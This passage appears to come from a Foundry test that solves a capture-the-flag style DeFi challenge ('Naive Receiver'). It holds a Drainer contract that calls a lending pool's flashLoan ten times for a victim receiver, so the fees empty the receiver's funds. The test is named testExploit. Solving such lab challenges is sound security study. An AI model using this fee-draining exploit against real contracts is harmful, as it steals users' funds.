...
contract Drainer {
    function drain(address pool, address borrower) public {
        for(uint256 i = 0; i < 10; i++){
            NaiveReceiverLenderPool(payable(pool)).flashLoan(borrower, 0);
        }
    }
}
contract NaiveReceiver is Test {
    ...
    function testExploit() public {
        ...
        drainer.drain(address(naiveReceiverLenderPool), address(flashLoanReceiver));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
